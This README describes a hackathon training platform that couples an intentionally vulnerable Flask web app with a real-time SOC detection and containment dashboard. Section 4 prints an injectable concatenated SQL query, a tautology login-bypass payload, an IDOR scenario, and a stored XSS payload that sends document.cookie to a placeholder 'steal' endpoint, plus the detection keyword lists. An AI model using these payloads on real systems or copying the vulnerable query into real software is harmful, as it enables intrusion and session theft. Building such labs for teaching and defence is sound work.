# SENTINEL-X 🛡️
## Red Team / Blue Team Live Exercise & SOC Monitoring Platform

> **University Cybersecurity Hackathon Project**  
> *"Create a vulnerable-by-design web app coupled with a live incident response monitoring dashboard."*

---

## 1. Project Overview

**SENTINEL-X** is a complete, closed-loop cybersecurity training and incident response platform designed for cybersecurity competitions and university hackathon demonstrations. It couples an intentionally vulnerable web application with an enterprise-grade live **Security Operations Center (SOC)** monitoring dashboard.

The entire security lifecycle operates in real time without manual browser refreshes:

```
RED TEAM ATTACK ──> VULNERABLE APP ──> STRUCTURED TELEMETRY ──> STREAM INGESTION ──> DETECTION ENGINE ──> SOC ALERT ──> INCIDENT TIMELINE ──> AUTOMATED CONTAINMENT
```

---

## 2. Architecture & Pipeline

```
                ┌─────────────────────────────────────────┐
                │          RED TEAM ATTACK ENGINE         │
                │  • SQLi (Auth Bypass / UNION Probes)    │
                │  • IDOR (Cross-Tenant Profile Scraping) │
                │  • Stored XSS (Script Injections)       │
                │  • Multi-Step Automated Kill Chain      │
                └────────────────────┬────────────────────┘
                                     │
                                     ▼
                ┌─────────────────────────────────────────┐
                │        TRAINING VULNERABLE APP          │
                │  POST /vulnerable/login                 │
                │  GET  /vulnerable/profile/<id>          │
                │  POST /vulnerable/comments              │
                │  [Controlled Local Isolated Lab]        │
                └────────────────────┬────────────────────┘
                                     │
                                     ▼
                ┌─────────────────────────────────────────┐
                │          TELEMETRY GENERATOR            │
                │  Standardized JSON Schema (RFC 3339)    │
                │  Request ID, IP, Method, Payload, Hash  │
                └────────────────────┬────────────────────┘
                                     │
                                     ▼
                ┌─────────────────────────────────────────┐
                │       STREAM INGESTION ENGINE           │
                │  Parse ──> Normalize ──> ACID Store     │
                └────────────────────┬────────────────────┘
                                     │
        ┌────────────────────────────┼────────────────────────────┐
        ▼                            ▼                            ▼
┌─────────────────────────┐  ┌─────────────────────────┐  ┌─────────────────────────┐
│    DETECTION ENGINE     │  │   CORRELATION ENGINE    │  │   CONTAINMENT ENGINE    │
│ • Heuristic Signatures  │  │ • 5-min Sliding Window  │  │ • App-Level Blocklist   │
│ • Confidence Scoring    │  │ • Multi-Stage Kill-Chain│  │ • 403 Gateway Intercept │
│ • Severity (INFO-CRIT)  │  │ • Incident Matrix (INC) │  │ • Auto Quarantine (60s) │
└───────────┬─────────────┘  └───────────┬─────────────┘  └───────────┬─────────────┘
            │                            │                            │
            └────────────────────────────┼────────────────────────────┘
                                         │
                                         ▼
                ┌─────────────────────────────────────────┐
                │          FLASK-SOCKETIO BRIDGE          │
                │  Sub-millisecond Real-Time Push Events  │
                └────────────────────┬────────────────────┘
                                         │
                                         ▼
    ┌─────────────────────────────────────────────────────────────────────────┐
    │                           SOC LIVE DASHBOARD                            │
    │  • Top Metrics: Events | Incidents | Critical | High | Contained Threats│
    │  • Live Scrolling Event Log Feed with Click-to-Inspect JSON Drawer      │
    │  • Chart.js Visualizations (Time Series, Severity, Exploit Categories)  │
    │  • Reconstructed Chronological Incident Timeline with Visual Vectors    │
    │  • Red Team Scenario Console & 15-Second Guided DEMO MODE               │
    │  • Multi-Threaded Exploit Ingestion Benchmark Console                   │
    └─────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Technology Stack

- **Backend Framework**: Python 3.10+ / Flask 3.1
- **Real-Time WebSockets**: Flask-SocketIO + simple-websocket
- **Persistence**: SQLite 3 with Write-Ahead Logging (WAL mode) and busy-timeout protection
- **Frontend Framework**: React 18 (Vite 5)
- **Styling**: Tailwind CSS (Dark Cyber-Defense Theme)
- **Visual Analytics**: Chart.js + react-chartjs-2
- **Icons & Visuals**: Lucide React
- **Benchmarking**: Concurrent Multi-Threaded Python `concurrent.futures`

---

## 4. Intentionally Vulnerable Endpoints

All vulnerable endpoints are isolated under the `/vulnerable/*` prefix and carry strict warnings:

### 1. SQL Injection (`POST /vulnerable/login` & `GET /vulnerable/search`)
- **Vulnerability**: Unsanitized raw string concatenation into database queries:
  ```python
  raw_query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}';"
  ```
- **Attacker Payload**: `admin' OR '1'='1' --`
- **Detection**: Analyzes SQL keywords (`UNION`, `SELECT`, `DROP`), quote balancing, comments (`--`, `/*`), and tautology expressions (`1=1`).
- **Telemetry Event**:
  ```json
  {
    "event_id": "EVT-8F29A1",
    "timestamp": "2026-09-17T18:30:22Z",
    "source_ip": "192.168.1.105",
    "method": "POST",
    "path": "/vulnerable/login",
    "event_type": "SQL_INJECTION",
    "severity": "CRITICAL",
    "status": "DETECTED",
    "user": "admin",
    "description": "SQL Injection authentication bypass successful: admin' OR '1'='1' --"
  }
  ```

### 2. Insecure Direct Object Reference (IDOR) (`GET /vulnerable/profile/<id>`)
- **Vulnerability**: Fails to authenticate whether the requesting session owns target user record:
  - User 101 (Alice Vance - Analyst)
  - User 102 (Bob Sterling - CFO, Confidential merger notes & wire tokens)
  - User 103 (Sarah Connor - CISO, Root vault pin)
- **Attacker Action**: An analyst session requests `/vulnerable/profile/102`.
- **Detection**: Cross-tenant comparison between `X-Session-User-Id` and requested ID, plus sequential scraping detection (101 → 102 → 103).
- **Telemetry Severity**: `HIGH`

### 3. Stored Cross-Site Scripting (XSS) (`POST /vulnerable/comments`)
- **Vulnerability**: Unsanitized user comments stored and rendered raw.
- **Attacker Payload**: `<script>fetch('.../steal?cookie=' + document.cookie);</script>`
- **Detection**: Identifies `<script>`, `onerror=`, `onload=`, `javascript:`, DOM theft strings.
- **Telemetry Severity**: `HIGH`

---

## 5. Standardized Schemas

### Structured Event Schema
```json
{
  "event_id": "EVT-00123",
  "timestamp": "2026-09-17T18:30:22Z",
  "source_ip": "127.0.0.1",
  "method": "POST",
  "path": "/vulnerable/login",
  "event_type": "SQL_INJECTION",
  "severity": "CRITICAL",
  "status": "DETECTED",
  "user": "admin",
  "description": "Suspicious SQL injection pattern detected",
  "request_id": "REQ-00123",
  "payload": {
    "username": "admin' OR '1'='1' --",
    "raw_query": "SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'..."
  }
}
```

### Detection Alert Schema
```json
{
  "alert_id": "ALT-001",
  "type": "SQL_INJECTION",
  "severity": "CRITICAL",
  "confidence": 0.98,
  "reason": "Active SQL Injection exploitation verified: Matched pattern: ('|\")\\s*OR\\s*('|\")?1",
  "event_id": "EVT-00123",
  "recommended_action": "TEMPORARILY_BLOCK_SOURCE",
  "source_ip": "127.0.0.1",
  "endpoint": "/vulnerable/login",
  "timestamp": "2026-09-17T18:30:22Z"
}
```

---

## 6. Automated Threat Containment (Safe Simulation)

To adhere strictly to cybersecurity lab safety guidelines:
1. SENTINEL-X **never** touches operating system firewalls or external networks.
2. It maintains an in-memory & SQLite application-level blocklist (`blocked_sources`).
3. When an attacker crosses defined thresholds (e.g. `CRITICAL` alert or confirmed exploit):
   - Offending IP is placed in containment for 60 seconds.
   - Any future request to `/vulnerable/*` from that IP is dropped with `HTTP 403 Forbidden`:
     ```json
     {
       "error": "THREAT_CONTAINED",
       "message": "Access blocked: This IP address is currently isolated under SENTINEL-X automated threat containment policy."
     }
     ```
   - Telemetry event `CONTAINMENT_ENFORCED` is recorded and pushed to the SOC HUD in real-time.
   - Analysts can manually release or enforce containment at any time.

---

## 7. Incident Correlation & Chronological Timeline

Rather than displaying isolated alerts, SENTINEL-X correlates multi-stage attacks into an **Incident Dossier** (`INC-001`):

1. Groups events by **Source IP**, **Session ID**, and **5-minute sliding window**.
2. Automatically elevates incident severity.
3. Classifies events into cyber kill-chain phases:
   - *Phase 1: Reconnaissance / Initial Probe*
   - *Phase 2: Active Exploitation (SQLi)*
   - *Phase 3: Privilege Escalation & Exfiltration (IDOR)*
   - *Phase 4: Automated Threat Containment*
4. Provides a visual **Incident Timeline** with downward arrows and click-to-inspect JSON logs.

---

## 8. Multi-Threaded Stress Testing

Measures actual ingestion engine throughput under concurrent load:
- **Request Batches**: 10, 50, 100, 500 requests
- **Concurrency**: 1, 5, 10 worker threads
- **Measured Metrics**:
  - Events Ingested
  - Events Detected
  - Ingestion Throughput (events/sec)
  - Average Detection Latency (ms via `time.perf_counter()`)

*Sample Benchmark (50 requests, 5 threads):*
- **Throughput**: ~126.5 events/sec
- **Average Detection Latency**: ~33.5 ms

---

## 9. Quick Installation & Running (Windows)

### Prerequisites
- Python 3.10+ (Installed with PATH configured)
- Node.js 18+ (Optional: Frontend is already pre-built in `frontend/dist`)

### Option A: One-Click Startup (Recommended)
Double-click:
```cmd
start_platform.bat
```
This installs dependencies, starts the backend, and opens `http://127.0.0.1:5000` in your browser.

### Option B: Manual Command Line
```powershell
# 1. Install Python dependencies
pip install -r requirements.txt

# 2. Run the unified platform
cd backend
python app.py
```
Open **http://127.0.0.1:5000** in your browser.

### Option C: Separate Frontend Dev Server
```powershell
# Terminal 1: Backend
cd backend
python app.py

# Terminal 2: Frontend
cd frontend
npm install
npm run dev
```

---

## 10. 10-Step Judge Demonstration Script

Follow this sequence during your hackathon presentation:

| Step | Action | Expected Result |
|---|---|---|
| **1** | Open `http://127.0.0.1:5000` | SOC Dashboard loads. WebSocket indicates `WS: CONNECTED`. |
| **2** | Navigate to **Attack Simulator** | 4 Predefined scenarios appear with payload preview. |
| **3** | Click **[Simulate SQL Injection]** | Pipeline triggers. Returns to dashboard showing new `CRITICAL` alert. |
| **4** | Observe Top Metrics | Total Events, Critical Alerts, and Chart.js graphs update without refresh. |
| **5** | Click **[Simulate IDOR]** | Unauthorized access of Bob CFO's record triggers `HIGH` IDOR alert. |
| **6** | Navigate to **Incidents & Timeline** | Incident `INC-xxxx` shows both attack vectors correlated into one dossier. |
| **7** | Click **[View Timeline]** | Full chronological attack reconstruction displays with downward vector arrows. |
| **8** | Observe Containment | Top HUD displays red `THREAT CONTAINED` banner with 60s countdown. |
| **9** | Open **Telemetry Stress Test** | Run 100 requests with 5 threads; observe live measured throughput (>100 evt/s). |
| **10** | Click **DEMO MODE (JUDGING)** | Runs deterministic 15-second guided presentation with HUD status banner. |

---

## 11. Safety & University Lab Guarantee

- **Strictly Localhost**: No external IPs or domains are scanned.
- **No System Modifications**: Uses application-level middleware rather than firewall changes.
- **No Malicious Payloads**: Training payloads are non-destructive and isolated to the local SQLite database.

---

*Built with precision for the University Cybersecurity Hackathon.*
